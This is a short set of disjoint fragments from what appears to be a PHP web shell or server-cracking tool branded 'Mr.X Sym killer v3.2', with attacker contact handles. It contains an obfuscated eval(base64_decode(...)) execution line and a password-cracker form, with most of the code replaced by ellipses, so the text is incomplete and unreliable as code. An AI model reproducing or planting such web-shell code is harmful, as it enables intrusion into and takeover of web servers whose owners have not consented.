...
eval(base64_decode($Getconfig));
	...
	$this->rows[$i][$k] = @addslashes($v);}
	 ...
	 echo "<br><title>Cracker By MR.X</title><form name=form method=POST>";
...
<center><br>
<font color=white size="50">Mr.X Sym killer </font><font color=#1eca33 size="4"> v3.2</font></center>
...
</font><br><font color=white>--==[[Greetz to]]==--</font><br><font  color=#1eca33>-=| Mr.X |=-<br>
<font  color=#1eca33>=| telegram: @jackleet Icq: @Sidhelchor |=-<br>
...
<span  class="footerlink"> ####### Coded By Mr.X #######</span>
...
function mrX($param, $kata1, $kata2){
